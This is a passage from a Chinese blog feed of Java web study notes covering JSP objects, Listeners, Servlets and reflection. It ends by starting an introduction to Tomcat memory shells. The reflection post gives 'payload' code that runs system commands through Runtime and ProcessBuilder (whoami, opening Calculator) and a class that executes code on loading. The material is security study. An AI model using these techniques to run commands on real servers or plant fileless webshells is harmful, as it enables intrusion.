class="table-container"><table><thead><tr><th>变量名</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>pageContext</td><td>PageContext</td><td>当前页面共享数据，还可以获取其他8个内置对象</td></tr><tr><td>request</td><td>HttpServletRequest</td><td>客户端请求对象，包含了所有客户端请求信息</td></tr><tr><td>session</td><td>HttpSession</td><td>请求会话</td></tr><tr><td>application</td><td>ServletContext</td><td>全局对象，所有用户间共享数据</td></tr><tr><td>response</td><td>HttpServletResponse</td><td>响应对象，主要用于服务器端设置响应信息</td></tr><tr><td>page</td><td>Object</td><td>当前Servlet对象,<code>this</code></td></tr><tr><td>out</td><td>JspWriter</td><td>输出对象，数据输出到页面上</td></tr><tr><td>config</td><td>ServletConfig</td><td>Servlet的配置对象</td></tr><tr><td>exception</td><td>Throwable</td><td>异常对象</td></tr></tbody></table></div>]]></content>
      
      
      
        <tags>
            
            <tag> Jsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Listener基础</title>
      <link href="/2021/11/21/Listener/"/>
      <url>/2021/11/21/Listener/</url>
      
        <content type="html"><![CDATA[<h1 id="Listener基础"><a href="#Listener基础" class="headerlink" title="Listener基础"></a>Listener基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Listener 顾名思义就是监听器，本质为实现特定接口的 Java 程序，用于监听方法和属性。当被监听的方法或者属性有所变化时，Listener 会自动执行所设定好的对应操作。</p><p>监听器的分类如下所示：</p><div class="table-container"><table><thead><tr><th style="text-align:left">事件源</th><th style="text-align:left">监听器</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">ServletContext</td><td style="text-align:left">ServletContextListener</td><td style="text-align:left">用于监听 ServletContext 对象的创建与销毁过程</td></tr><tr><td style="text-align:left">HttpSession</td><td style="text-align:left">HttpSessionListener</td><td style="text-align:left">用于监听 HttpSession 对象的创建和销毁过程</td></tr><tr><td style="text-align:left">ServletRequest</td><td style="text-align:left">ServletRequestListener</td><td style="text-align:left">用于监听 ServletRequest 对象的创建和销毁过程</td></tr><tr><td style="text-align:left">ServletContext</td><td style="text-align:left">ServletContextAttributeListener</td><td style="text-align:left">用于监听 ServletContext 对象的属性新增、移除和替换</td></tr><tr><td style="text-align:left">HttpSession</td><td style="text-align:left">HttpSessionAttributeListener</td><td style="text-align:left">用于监听 HttpSession 对象的属性新增、移除和替换</td></tr><tr><td style="text-align:left">ServletRequest</td><td style="text-align:left">ServletRequestAttributeListener</td><td style="text-align:left">用于监听 HttpServletRequest 对象的属性新增、移除和替换</td></tr><tr><td style="text-align:left">HttpSession</td><td style="text-align:left">HttpSessionBindingListener</td><td style="text-align:left">用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件</td></tr><tr><td style="text-align:left">HttpSession</td><td style="text-align:left">HttpSessionActivationListener</td><td style="text-align:left">用于监听 HttpSession 中对象活化和钝化的过程</td></tr></tbody></table></div><p>较为常用的有<code>ServletContextListener</code>、<code>HttpSessionListener</code>和<code>ServletRequestListener</code>等。</p><h2 id="基于注解实现的Listener"><a href="#基于注解实现的Listener" class="headerlink" title="基于注解实现的Listener"></a>基于注解实现的Listener</h2><p>一个Web服务器可以运行一个或多个WebApp，对于每个WebApp，Web服务器都会为其创建一个全局唯一的<code>ServletContext</code>实例，<code>ServletContext</code>实例最大的作用就是设置和共享全局信息。</p><p>编写一个实现<code>ServletContextListener</code>接口的实现类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is initialized!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent servletContextEvent)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is destroyed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动 Tomcat 服务器，<code>ServletContextListener</code>监听到<code>ServletContext</code>对象被创建，触发<code>contextInitialized()</code>方法。</p><p>关闭 Tomcat 服务器，<code>ServletContextListener</code>监听到<code>ServletContext</code>对象被销毁，触发<code>contextDestroyed</code>方法。<img src="/2021/11/21/Listener/image-20221025104019871.png" alt="image-20221025104019871"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于<code>Servlet</code>、<code>Filter</code>和<code>Listener</code>的调用顺序可以在<code>org.apache.catalina.core.StandardContext#startInternal()</code>方法中找到答案<img src="/2021/11/21/Listener/image-20221025105514201.png" alt="image-20221025105514201"></p><p>如图所示，调用顺序分别为<code>listenerStart()</code>、<code>filterStart()</code>和<code>loadOnStartup()</code>，三个方法分别调用了<code>Listener</code>、<code>Filter</code>和<code>Servlet</code>，因此可以得到调用顺序为：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listener --&gt; Filter --&gt; Servlet</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> Listener基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet基础</title>
      <link href="/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Servlet基础"><a href="#Servlet基础" class="headerlink" title="Servlet基础"></a>Servlet基础</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p><p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p><p>狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。</p></blockquote><p>Java EE 提供了 Servlet API，通过 Servlet，我们可以处理 Web 应用程序的 HTTP 请求以及响应，关系如下：</p><p><img src="images/servlet-arch.jpeg" alt="servlet-arch"></p><h2 id="Servlet的定义"><a href="#Servlet的定义" class="headerlink" title="Servlet的定义"></a>Servlet的定义</h2><p>定义 Servlet 只需要编写的类继承<code>javax.servlet.http.HttpServlet</code>类并重写<code>doGet()</code>或者<code>doPost()</code>等代表请求方式的方法即可。</p><h3 id="HttpServlet"><a href="#HttpServlet" class="headerlink" title="HttpServlet"></a>HttpServlet</h3><p>先了解一下<code>HttpServlet</code>类，从图中可以看到该类继承于<code>GenericServlet</code>类<br><img src="images/image-20221021111852316.png" alt="image-20221021111852316"></p><p>而<code>GenericServlet</code>类实现了<code>Servlet</code>、<code>ServletConfig</code>和<code>Serializable</code>接口<br><img src="images/image-20221021112209736.png" alt="image-20221021112209736"></p><p><code>HttpServlet</code>抽象类中含有<code>doGet/doPost/doDelete/doHead/doPut/doOptions/doTrace</code>等方法用于处理客户端的不同请求方法，因此我们在定义 Servlet 时，要重写该抽象类中的方法用于处理请求。</p><h3 id="基于注解方式配置"><a href="#基于注解方式配置" class="headerlink" title="基于注解方式配置"></a>基于注解方式配置</h3><p>在 Servlet 3.0 之后可以采用注解方式配置 Servlet，在任意类导入<code>javax.servlet.annotation.WebServlet;</code></p><p>在 pom.xml 文件中添加 maven 依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>编写 ServletTest.class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/21 10:41</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.write(<span class="string">&quot;&lt;h1&gt;Hello, dotast!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问<code>/hello</code>接口<br><img src="images/image-20221021113345710.png" alt="image-20221021113345710"></p><h3 id="基于web-xml文件配置"><a href="#基于web-xml文件配置" class="headerlink" title="基于web.xml文件配置"></a>基于web.xml文件配置</h3><p>编写好 ServletTest 类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/21 10:41</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.write(<span class="string">&quot;&lt;h1&gt;Hello, dotast!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 web.xml 文件中配置 servlet 标签<br><img src="images/image-20221021114220068.png" alt="image-20221021114220068"></p><p>启动后访问定义好的<code>url-pattern</code><br><img src="images/image-20221021114304256.png" alt="image-20221021114304256"></p><h2 id="Request与Response"><a href="#Request与Response" class="headerlink" title="Request与Response"></a>Request与Response</h2><p>在前面我们编写的 Servlet 类中，<code>doGet()</code>方法传入了<code>HttpServletRequest</code>对象和<code>HttpServletResponse</code>对象<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.write(<span class="string">&quot;&lt;h1&gt;Hello, dotast!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>HttpServletRequest</code>对象用于处理来自客户端的请求，当客户端通过HTTP协议访问服务器时，HTTP 中的所有信息都封装在这个对象中，通过<code>HttpServletRequest</code>对象可以获取到客户端请求的所有信息。</p><p><code>HttpServletResponse</code>对象用于响应客户端的请求，通过<code>HttpServletResponse</code>对象可以处理服务器端对客户端请求响应。</p><h3 id="HttpServletRequest常用方法"><a href="#HttpServletRequest常用方法" class="headerlink" title="HttpServletRequest常用方法"></a>HttpServletRequest常用方法</h3><div class="table-container"><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getParameter(String name)</td><td>获取请求中的参数，该参数是由name指定的</td></tr><tr><td>getParameterValues(String name)</td><td>返回请求中的参数值，该参数值是由name指定的</td></tr><tr><td>getRealPath(String path)</td><td>获取Web资源目录</td></tr><tr><td>getAttribute(String name)</td><td>返回name指定的属性值</td></tr><tr><td>getAttributeNames()</td><td>返回当前请求的所有属性的名字集合</td></tr><tr><td>getCookies()</td><td>返回客户端发送的Cookie</td></tr><tr><td>getSession()</td><td>获取session回话对象</td></tr><tr><td>getInputStream()</td><td>获取请求主题的输入流</td></tr><tr><td>getReader()</td><td>获取请求主体的数据流</td></tr><tr><td>getMethod()</td><td>获取发送请求的方式，如GET、POST</td></tr><tr><td>getParameterNames()</td><td>获取请求中所有参数的名称</td></tr><tr><td>getRemoteAddr()</td><td>获取客户端的IP地址</td></tr><tr><td>getRemoteHost()</td><td>获取客户端名称</td></tr><tr><td>getServerPath()</td><td>获取请求的文件的路径</td></tr></tbody></table></div><h3 id="HttpServletResponse常用方法"><a href="#HttpServletResponse常用方法" class="headerlink" title="HttpServletResponse常用方法"></a>HttpServletResponse常用方法</h3><div class="table-container"><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getWriter()</td><td>获取响应打印流对象</td></tr><tr><td>getOutputStream()</td><td>获取响应流对象</td></tr><tr><td>addCookie(Cookie cookie)</td><td>将指定的Cookie加入到当前的响应中</td></tr><tr><td>addHeader(String name,String value)</td><td>将指定的名字和值加入到响应的头信息中</td></tr><tr><td>sendError(int sc)</td><td>使用指定状态码发送一个错误到客户端</td></tr><tr><td>sendRedirect(String location)</td><td>发送一个临时的响应到客户端</td></tr><tr><td>setDateHeader(String name,long date)</td><td>将给出的名字和日期设置响应的头部</td></tr><tr><td>setHeader(String name,String value)</td><td>将给出的名字和值设置响应的头部</td></tr><tr><td>setStatus(int sc)</td><td>给当前响应设置状态码</td></tr><tr><td>setContentType(String ContentType)</td><td>设置响应的MIME类型</td></tr></tbody></table></div>]]></content>
      
      
      
        <tags>
            
            <tag> Servlet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2021/11/21/%E5%8F%8D%E5%B0%84/"/>
      <url>/2021/11/21/%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>反射是大多数语言都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将 Java 这种静态语⾔附加上动态特性。</p></blockquote><p>在前面 JavaSE 学习的时候已经了解过反射的基本知识：<a href="../00-JavaSE/2-反射/反射.md">反射</a> ，所以这里开始学习在 Java安全中，反射可以给我们带来什么以及如何去利用。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>根据前面的学习，反射中的几个极为重要的利用方法：</p><p>获取 class 实例 之后</p><ul><li>获取类名：<code>forName()</code></li><li>创建对应类型的实例：<code>newInstance()</code></li><li>获取字段的值：<code>get()</code>、设置字段的值：<code>set()</code></li><li>获取方法：<code>getMethod()</code>、调用方法：<code>invoke()</code></li></ul><p><strong>我们如何通过反射去执行命令？</strong></p><p>最常见的情况就是调用<code>java.lang.Runtime</code>类，按照我们前面的学习，构造方式如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(aClass.newInstance(),<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但运行后报了错，报错原因是类的构造方法是私有的，而<code>newInstance()</code>只能调用 public 无参构造方法<br><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20220714174002665.png" alt="image-20220714174002665">查看手册，我们可以通过<code>getRuntime</code>来获取到当前的<code>Runtime</code>类对象<br><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20220714173931928.png" alt="image-20220714173931928"></p><p>因此构造 payload 如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(aClass),<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*变成一句话就是</span></span><br><span class="line"><span class="comment">Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)),&quot;&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20220714174546983.png" alt="image-20220714174546983"></p><p>当然在前面的学习中，我们知道可以通过<code>getDeclaredConstructor()</code>去获取私有的构造方法，因此 payload 还可以构造成<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> aClass.getDeclaredConstructor();</span><br><span class="line">        con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(con.newInstance(),<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在《Java安全漫谈中》中，p牛提过：<u>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</u>的问题并给出了解决方案</p><p>我们采用<code>getConstructor</code>来替代<code>getMethod</code>，同时调用<code>java.lang.ProcessBuilder</code>类来执行命令。下面 payload 使用的是<code>ProcessBuilder</code>其中的一个构造函数<code>public ProcessBuilder(List&lt;String&gt; command)</code>，因此需要传入<code>List.class</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aclass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        aclass.getMethod(<span class="string">&quot;start&quot;</span>).invoke(aclass.getConstructor(List.class).</span><br><span class="line">                                         newInstance(Arrays.asList(<span class="string">&quot;open&quot;</span>,<span class="string">&quot;/System/Applications/Calculator.app&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20220714184847611.png" alt="image-20220714184847611"></p><h2 id="调用恶意类"><a href="#调用恶意类" class="headerlink" title="调用恶意类"></a>调用恶意类</h2><p>编写一个恶意类 evailClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evailClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;i am static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用<code>Class.forName()</code>调用恶意类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.test.evailClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后会成功执行恶意类中的<code>static&#123;&#125;</code>里的内容<br><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20221010112804706.png" alt="image-20221010112804706"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马之Listener</title>
      <link href="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马之Listener"><a href="#Tomcat内存马之Listener" class="headerlink" title="Tomcat内存马之Listener"></a>Tomcat内存马之Listener</h1><h2 id="初识Tomcat内存马"><a href="#初识Tomcat内存马" class="headerlink" title="初识Tomcat内存马"></a>初识Tomcat内存马</h2><p>关于内存马，第一次接触是 PHP 的不死马，其原理是在内存中执行死循环，并删除自身文件，起到维持权限的作用，而 Tomcat 的内存马原理则与其不同。</p><p>在前面的学习我们知道，在 Java 程序中，HTTP 的请求会按照<code>Listener --&gt; Filter --&gt; Servlet</code>的顺序经过这三大组件，Tomcat 内存马则在请求的过程中修改程序本身的组件或者注册新的恶意组件到 Tomcat 服务器中，插入恶意代码，完成内存马的注入。</p><p>Tomcat 内存马技术的实现依赖于<code>Servlet 3.0</code>版本之后的动态注册组件，而 Tomcat 7.x 版本才开始支持<code>Servlet 3.0</code>。</p><h2 id="Tomcat基础知识"><a href="#Tomcat基础知识" class="headerlink" title="Tomcat基础知识"></a>Tomcat基础知识</h2><p>在学习 Java 内存马之前，我们得了解一些关于 Tomcat 的基础知识。</p><p>Tomcat 本身是由 Apache 软件基金会属下 Jakarta 开发的 Servlet 容器，目的是实现对 Servlet 和 JSP 的支持。其广为人知的是充当 Java 程序的 Web服务器，这是因为在 Tomcat 中内嵌了 HTTP 服务器。</p><p>Tomcat 对于 HTTP 请求的处理可以简化成如下图所示：<br><img src="images/image-20221026123041907.png" alt="image-20221026123041907"></p><p>Tomcat 通过<code>Connector</code>组件接收并解析 HTTP 请求报文，创建<code>ServletRequest</code>对象发送给<code>Container</code>容器进行处理。<code>Container</code>容器处理完之后将响应封装成<code>ServletResponse</code>对象返回到<code>Connector</code>组件，<code>Connector</code>将其转换成 HTTP 响应报文返回到客户端，完成一次请求响应动作。</p><p>下面简单了解一下其中的组件和服务。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p><code>Server</code>指代整个 Tomcat 